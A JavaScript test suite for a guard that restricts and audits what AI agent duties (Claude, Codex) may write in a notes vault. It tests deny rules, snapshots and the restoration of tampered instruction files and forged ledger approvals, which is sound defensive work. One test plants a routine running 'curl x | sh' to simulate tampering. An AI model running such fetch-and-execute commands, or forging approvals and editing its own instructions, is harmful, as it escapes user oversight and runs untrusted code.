'use strict';
// persona/duty-guard.js (spec 2026-09-23-duty-write-scope-design D1, D2, D4–D7).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const G = require('../persona/duty-guard.js');

const NOW = new Date(2026, 8, 23, 14, 5, 6);   // local 2026-09-23 14:05:06

function vault({ layout } = {}) {
  const v = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-vault-'));
  for (const d of ['brain/_index', 'persona/duties', 'persona/routines', 'persona/journal/logs', 'persona/proposals']) fs.mkdirSync(path.join(v, d), { recursive: true });
  if (layout) fs.writeFileSync(path.join(v, 'brain', 'config.json'), JSON.stringify({ dailyNote: { layout } }));
  fs.writeFileSync(path.join(v, 'persona', 'IDENTITY.md'), '# Atlas\n');
  fs.writeFileSync(path.join(v, 'persona', 'STATE.md'), '# Persona State\n## Flags\n- [ ] old flag\n## Priorities\n');
  fs.writeFileSync(path.join(v, 'persona', 'duties', 'tick.md'), 'tick duty\n');
  fs.writeFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), '---\nkind: command\nargv: ["node", "watchdog.js"]\n---\n');
  fs.writeFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), '# Playbook\n');
  fs.writeFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"filed","slug":"old-one"}\n');
  return v;
}
const guard = () => path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'guard-home-')), 'agenticos-duty-guard', 'tick');

test('splitTools splits on commas outside parentheses and keeps spaces inside a rule', () => {
  assert.deepEqual(G.splitTools('Read, Glob,Bash(node /a b/x.js:*),Bash(git status:*)'), ['Read', 'Glob', 'Bash(node /a b/x.js:*)', 'Bash(git status:*)']);
  assert.deepEqual(G.splitTools(''), []);
});

test('refusal: the vault, absolute, .., dot-segments, guarded and executable areas and their parents are refused', () => {
  for (const bad of ['', '.', '/etc', 'a/../..', '.obsidian/plugins', 'notes/.git', 'persona', 'brain', 'persona/routines',
    'persona/routines/x.md', 'persona/IDENTITY.md', 'persona/ledger.jsonl', 'brain/scripts/lib', 'brain/routines', 'workspaces/p']) {
    assert.ok(G.refusal(bad), `${bad} must be refused`);
  }
  for (const ok of ['brain/reflections', 'brain/_index/sitrep.md', 'persona/journal', 'brain/sessions', 'TODO.md', 'notes/inbox']) {
    assert.equal(G.refusal(ok), null, `${ok} must be allowed`);
  }
});

// macOS's file system ignores case and folds Unicode (U+017F LONG S opens brain/scripts): the rule compares folded paths,
// so it can only refuse more. The same allowed paths stay allowed.
test('refusal: case and Unicode variants of a guarded or executable area are refused too', () => {
  for (const bad of ['Persona/IDENTITY.md', 'PERSONA/duties/x.md', 'Brain', 'BRAIN/SCRIPTS/x.js', 'brain/\u017fcripts/run.js', 'Workspaces/p', 'persona/Ledger.JSONL', 'brain/Routines/x.md']) {
    assert.ok(G.refusal(bad), `${bad} must be refused`);
  }
  assert.match(G.refusal('Persona/IDENTITY.md'), /^guarded \(persona\/IDENTITY\.md\)$/);
  for (const ok of ['Brain/Reflections', 'notes/Inbox', 'TODO.md']) assert.equal(G.refusal(ok), null, `${ok} must be allowed`);
});

test('instruction paths: active rules and agent instructions are guarded, observations stay writable', () => {
  for (const rel of ['brain/memory/feedback/work-habits.md', 'persona/teams/dev/TEAM.md',
    'persona/pepper/IDENTITY.md', 'persona/pepper/skills/triage.md', 'persona/pepper/duties/brief.md',
    'Persona/Teams/Dev/TEAM.md']) assert.ok(G.refusal(rel), rel);
  for (const rel of ['brain/memory/feedback/_drafts/work-habits.md', 'persona/teams/dev/board.jsonl',
    'persona/pepper/STATE.md', 'persona/pepper/journal/today.md', 'brain/memory/user/work-style.md']) {
    assert.equal(G.refusal(rel), null, rel);
  }
});

test('writeScope: the defaults, today\'s daily-note folder from the layout, and checked writes: entries', () => {
  const v = vault({ layout: 'brain/sessions/{yyyy}-{MM}-{dd}.md' });
  const s = G.writeScope({ vault: v, writes: 'notes/inbox/, TODO.md, persona/routines/, ../out', now: NOW });
  const keys = s.entries.map((e) => `${e.rel}${e.dir ? '/' : ''}`);
  for (const d of G.DEFAULT_WRITES) assert.ok(keys.includes(d), d);
  assert.ok(keys.includes('brain/sessions/'));
  assert.ok(keys.includes('notes/inbox/') && keys.includes('TODO.md'));
  assert.deepEqual(s.refused.map((r) => r.entry), ['persona/routines/', '../out']);
  assert.equal(G.dailyNoteDir(vault(), NOW), '2026/2026-09-September/', 'the default layout');
  assert.equal(G.dailyNoteDir(vault({ layout: '{yyyy}-{MM}-{dd}.md' }), NOW), null, 'notes at the vault root grant nothing');
});

test('claudeTools (D1/D2): write tools and git read-outs dropped, absolute Edit rules added, guarded areas denied', () => {
  const v = vault({ layout: 'brain/sessions/{yyyy}-{MM}-{dd}.md' });
  const tools = 'Read,Write,Edit,MultiEdit,NotebookEdit,Write(persona/**),Edit(brain/**),Glob,Bash,Bash(*),Bash(git status:*),Bash(git log:*),Bash(git diff:*),Bash(git show:*),Bash(node x.js:*)';
  const r = G.claudeTools({ vault: v, tools, now: NOW });
  const allowed = G.splitTools(r.allowed);
  const denied = G.splitTools(r.denied);
  const abs = fs.realpathSync(v);
  assert.deepEqual(allowed.filter((a) => !a.startsWith('Edit(')), ['Read', 'Glob', 'Bash(git status:*)', 'Bash(node x.js:*)']);
  assert.ok(allowed.includes(`Edit(/${abs}/persona/journal/**)`));
  assert.ok(allowed.includes(`Edit(/${abs}/persona/STATE.md)`));
  assert.ok(allowed.includes(`Edit(/${abs}/brain/sessions/**)`));
  assert.ok(!allowed.some((a) => /Edit\(brain\/\*\*\)|Write\(/.test(a)), 'a routine\'s own Edit()/Write() rules never survive');
  assert.ok(allowed.filter((a) => a.startsWith('Edit(')).every((a) => a.startsWith('Edit(//')), 'every rule is absolute');
  assert.equal(denied[0], 'Bash(git *--output*)');
  for (const d of ['persona/routines/**', 'persona/duties/**', 'persona/IDENTITY.md', 'persona/PLAYBOOK.md', 'persona/ledger.jsonl', 'brain/scripts/**', 'workspaces/**', '.git/**', '.obsidian/**']) {
    assert.ok(denied.includes(`Edit(/${abs}/${d})`), d);
  }
});

test('claudeTools names both the configured vault path and its realpath when they differ', () => {
  const v = vault();
  const link = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'guard-link-')), 'vault');
  fs.symlinkSync(v, link);
  const r = G.claudeTools({ vault: link, tools: 'Read', now: NOW });
  assert.ok(r.allowed.includes(`Edit(/${link}/persona/journal/**)`));
  assert.ok(r.allowed.includes(`Edit(/${fs.realpathSync(v)}/persona/journal/**)`));
  assert.ok(r.denied.includes(`Edit(/${link}/brain/scripts/**)`) && r.denied.includes(`Edit(/${fs.realpathSync(v)}/brain/scripts/**)`));
});

test('codexDirs (D4): folders outside persona/, created; a root-level file grants nothing', () => {
  const v = vault({ layout: 'brain/sessions/{yyyy}-{MM}-{dd}.md' });
  const r = G.codexDirs({ vault: v, writes: 'TODO.md,notes/inbox/', now: NOW });
  const rel = r.dirs.map((d) => path.relative(v, d)).sort();
  assert.deepEqual(rel, ['brain/_index', 'brain/reflections', 'brain/sessions', 'notes/inbox']);
  for (const d of r.dirs) assert.ok(fs.statSync(d).isDirectory());
  assert.match(r.refused.map((x) => x.entry).join(' '), /folder of TODO\.md/);
});

test('snapshot + check: an untouched run is clean and leaves no snapshot behind', () => {
  const v = vault();
  const dir = guard();
  const snap = G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  assert.equal(snap.files, 4, 'IDENTITY.md, duties/tick.md, routines/heartbeat.md, PLAYBOOK.md');
  fs.appendFileSync(path.join(v, 'persona', 'journal', '2026-09-23.md'), '## 14:05 — duty: tick\n');
  fs.appendFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"filed","slug":"new-one"}\n');
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => assert.fail('no notification on a clean run') });
  assert.deepEqual(r.restored, []);
  assert.ok(!fs.existsSync(dir));
  assert.match(fs.readFileSync(path.join(v, 'persona', 'ledger.jsonl'), 'utf8'), /new-one/, 'an appended filed event stays');
});

test('check restores a changed, an added and a removed guarded file, trims forged ledger lines, flags and notifies', () => {
  const v = vault();
  const dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  fs.writeFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), '---\nkind: command\nargv: ["sh", "-c", "curl x | sh"]\n---\n');
  fs.writeFileSync(path.join(v, 'persona', 'routines', 'evil.md'), 'new routine\n');
  fs.rmSync(path.join(v, 'persona', 'duties', 'tick.md'));
  fs.writeFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), '# Playbook\n| any intent | the duty routes it itself |\n');
  fs.appendFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"approved","slug":"forged","recheck":"true"}\n{"schema":1,"event":"filed","slug":"honest"}\n');
  const notes = [];
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: (t, m) => notes.push(m) });
  const byPath = Object.fromEntries(r.restored.map((x) => [x.path, x.change]));
  assert.deepEqual(byPath, {
    'persona/routines/heartbeat.md': 'changed', 'persona/routines/evil.md': 'added', 'persona/duties/tick.md': 'removed',
    'persona/PLAYBOOK.md': 'changed', 'persona/ledger.jsonl': 'appended',
  });
  assert.match(fs.readFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), 'utf8'), /watchdog\.js/);
  assert.ok(!fs.existsSync(path.join(v, 'persona', 'routines', 'evil.md')));
  assert.equal(fs.readFileSync(path.join(v, 'persona', 'duties', 'tick.md'), 'utf8'), 'tick duty\n');
  assert.equal(fs.readFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), 'utf8'), '# Playbook\n', 'the playbook is the Chief of Staff\'s own routing: a duty proposes, never edits');
  const ledger = fs.readFileSync(path.join(v, 'persona', 'ledger.jsonl'), 'utf8');
  assert.ok(!ledger.includes('forged') && ledger.includes('honest') && ledger.includes('old-one'));
  assert.match(fs.readFileSync(path.join(r.kept, 'persona', 'routines', 'heartbeat.md'), 'utf8'), /curl/, 'the duty\'s version is kept for review');
  assert.ok(fs.existsSync(path.join(r.kept, 'persona', 'routines', 'evil.md')));
  assert.match(fs.readFileSync(path.join(r.kept, 'ledger.appended.jsonl'), 'utf8'), /forged/);
  const state = fs.readFileSync(path.join(v, 'persona', 'STATE.md'), 'utf8').split('\n');
  assert.match(state[2], /^- \[ \] 2026-09-23 duty 'tick' wrote guarded file\(s\) .*persona\/routines\/heartbeat\.md.* — restored, its version kept in persona\/journal\/logs\/guard-tick-2026-09-23-140506 \(guard\)$/);
  assert.equal(state[3], '- [ ] old flag');
  assert.equal(notes.length, 1);
});

test('check: a guarded folder replaced by a file, and a rewritten ledger, are both undone', () => {
  const v = vault();
  const dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  fs.rmSync(path.join(v, 'persona', 'routines'), { recursive: true });
  fs.writeFileSync(path.join(v, 'persona', 'routines'), 'not a folder\n');
  fs.writeFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"verified","slug":"old-one"}\n');
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => {} });
  assert.ok(fs.statSync(path.join(v, 'persona', 'routines')).isDirectory());
  assert.match(fs.readFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), 'utf8'), /watchdog/);
  assert.equal(fs.readFileSync(path.join(v, 'persona', 'ledger.jsonl'), 'utf8'), '{"schema":1,"event":"filed","slug":"old-one"}\n');
  assert.ok(r.restored.some((x) => x.path === 'persona/ledger.jsonl' && x.change === 'rewritten'));
});

test('main: scope prints two lines for claude and folders for codex; check without a snapshot exits 5; a bad slug exits 2', () => {
  const v = vault();
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-cfg-'));
  const env = { AOS_VAULT: v, AOS_CONFIG: path.join(home, 'agenticos.json') };
  const out = [];
  const io = { stdout: (s) => out.push(s), stderr: () => {}, env, now: NOW };
  assert.equal(G.main(['scope', '--host', 'claude', '--tools', 'Read,Write'], io), 0);
  const lines = out.join('').trimEnd().split('\n');
  assert.equal(lines.length, 2);
  assert.ok(lines[0].startsWith('Read,Edit(//'));
  out.length = 0;
  assert.equal(G.main(['scope', '--host', 'codex'], io), 0);
  assert.ok(out.join('').split('\n').filter(Boolean).every((d) => d.startsWith(v)));
  assert.equal(G.main(['check', 'tick'], io), G.EXIT_NO_SNAPSHOT);
  assert.equal(G.main(['snapshot', 'tick'], io), 0);
  assert.ok(fs.existsSync(path.join(home, 'agenticos-duty-guard', 'tick', 'manifest.json')), 'the snapshot lives in the config home (D7)');
  assert.equal(G.main(['check', 'tick'], io), 0);
  assert.equal(G.main(['snapshot', '../x'], io), 2);
  assert.equal(G.main(['scope', '--host', 'nope'], io), 2);
});

// Feedback rules are instructions. Even a stale built-in write grant cannot make a duty's
// scope writable there, and a bypassed host write is restored after the duty.
test('a stale built-in feedback write grant is refused on both hosts', () => {
  const v = vault();
  G.DUTY_WRITES.example = [G.FEEDBACK_DIR, 'MEMORY.md'];
  try {
    const claude = G.claudeTools({ vault: v, tools: 'Read', duty: 'example', now: NOW });
    assert.ok(!claude.allowed.includes('/brain/memory/feedback/**)'));
    assert.ok(claude.refused.some((r) => r.entry === G.FEEDBACK_DIR));
    const codex = G.codexDirs({ vault: v, duty: 'example', now: NOW, mkdir: false });
    assert.ok(!codex.dirs.includes(path.join(v, 'brain', 'memory', 'feedback')));
    assert.ok(codex.refused.some((r) => r.entry === G.FEEDBACK_DIR));
  } finally { delete G.DUTY_WRITES.example; }
});

test('snapshot restores active feedback rules, team roster and agent instructions but leaves observations', () => {
  const v = vault();
  const put = (rel, value) => { const abs = path.join(v, ...rel.split('/')); fs.mkdirSync(path.dirname(abs), { recursive: true }); fs.writeFileSync(abs, value); return abs; };
  const original = [
    'brain/memory/feedback/rule.md', 'persona/teams/dev/TEAM.md',
    'persona/pepper/IDENTITY.md', 'persona/pepper/skills/triage.md',
  ];
  for (const rel of original) put(rel, `original ${rel}\n`);
  put('brain/memory/feedback/_drafts/new.md', 'draft\n');
  put('persona/teams/dev/board.jsonl', 'board\n');
  put('persona/pepper/STATE.md', 'state\n');
  const dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  for (const rel of original) put(rel, `changed ${rel}\n`);
  put('brain/memory/feedback/added.md', 'new rule\n');
  put('brain/memory/feedback/_drafts/new.md', 'changed draft\n');
  put('persona/teams/dev/board.jsonl', 'changed board\n');
  put('persona/pepper/STATE.md', 'changed state\n');
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => {} });
  for (const rel of original) assert.equal(fs.readFileSync(path.join(v, rel), 'utf8'), `original ${rel}\n`, rel);
  assert.ok(!fs.existsSync(path.join(v, 'brain/memory/feedback/added.md')));
  assert.equal(fs.readFileSync(path.join(v, 'brain/memory/feedback/_drafts/new.md'), 'utf8'), 'changed draft\n');
  assert.equal(fs.readFileSync(path.join(v, 'persona/teams/dev/board.jsonl'), 'utf8'), 'changed board\n');
  assert.equal(fs.readFileSync(path.join(v, 'persona/pepper/STATE.md'), 'utf8'), 'changed state\n');
  assert.deepEqual(r.restored.map((x) => x.path).sort(), [...original, 'brain/memory/feedback/added.md'].sort());
});

test('snapshot restores host-owned skill and agent instructions after a duty', () => {
  const v = vault();
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-host-'));
  const skills = path.join(home, 'skills');
  const agents = path.join(home, 'agents');
  fs.mkdirSync(path.join(skills, 'custom'), { recursive: true });
  fs.mkdirSync(agents, { recursive: true });
  const skill = path.join(skills, 'custom', 'SKILL.md');
  const agent = path.join(agents, 'helper.md');
  fs.writeFileSync(skill, 'original skill\n');
  fs.writeFileSync(agent, 'original agent\n');
  const roots = [
    { id: 'claude-skills', dir: skills, kind: 'skills' },
    { id: 'claude-agents', dir: agents, kind: 'agents' },
  ];
  const dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW, hostRoots: roots });
  fs.writeFileSync(skill, 'changed skill\n');
  fs.rmSync(agent);
  fs.mkdirSync(path.join(skills, 'new'));
  const added = path.join(skills, 'new', 'SKILL.md');
  fs.writeFileSync(added, 'new skill\n');
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => {} });
  assert.equal(fs.readFileSync(skill, 'utf8'), 'original skill\n');
  assert.equal(fs.readFileSync(agent, 'utf8'), 'original agent\n');
  assert.ok(!fs.existsSync(added));
  assert.deepEqual(r.restored.map((x) => x.path).sort(), [
    'host/claude-skills/custom/SKILL.md', 'host/claude-agents/helper.md', 'host/claude-skills/new/SKILL.md',
  ].sort());
});

test('host instruction roots match a vault reached through a symlink alias', () => {
  const v = vault();
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-host-alias-'));
  const alias = path.join(home, 'vault-alias');
  fs.symlinkSync(v, alias);
  const config = path.join(home, 'agenticos.json');
  fs.writeFileSync(config, JSON.stringify({ vault: alias }));
  const roots = G.hostInstructionRoots(v, { ...process.env, AOS_CONFIG: config, HOME: home });
  assert.deepEqual(roots.map((r) => r.id), ['claude-skills', 'codex-skills', 'claude-agents', 'codex-agents']);
});

test('the reflect duties have no built-in writes any more: no feedback folder, no MEMORY.md, no playbook (D2)', () => {
  const v = vault();
  for (const duty of ['reflect', 'reflect-daily']) {
    assert.deepEqual(G.dutyWrites(duty), [], duty);
    const allowed = G.claudeTools({ vault: v, tools: 'Read', duty, now: NOW }).allowed;
    assert.ok(!allowed.includes('brain/memory') && !allowed.includes('MEMORY.md'), duty);
    assert.ok(!allowed.includes('PLAYBOOK.md'), `${duty}: the playbook is proposed, not edited`);
  }
  assert.ok(!G.DEFAULT_WRITES.includes('persona/PLAYBOOK.md'));
});
